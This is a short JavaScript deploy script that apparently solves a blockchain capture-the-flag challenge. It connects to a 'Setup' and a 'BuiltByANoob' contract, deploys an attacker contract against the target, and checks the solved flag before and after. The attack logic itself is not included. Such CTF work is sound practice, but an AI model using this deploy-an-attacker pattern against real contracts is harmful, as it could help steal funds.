const { parseEther } = require("ethers/lib/utils");

async function main() {
  const EXPLOIT = await ethers.getContractFactory("naps62Attacker");

  const setup = await ethers.getContractAt( "Setup", "0x4742FD1862E94dc74AeD62A96B6374E68e658f80" );
  const ctf = await ethers.getContractAt( "BuiltByANoob", "0xA1BCb047E9dc4aCcB36c14288239f9283DF3E68e" );

  console.log("solved:", await setup.isSolved());

  await EXPLOIT.deploy(ctf.address);

  console.log("solved:", await setup.isSolved());
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
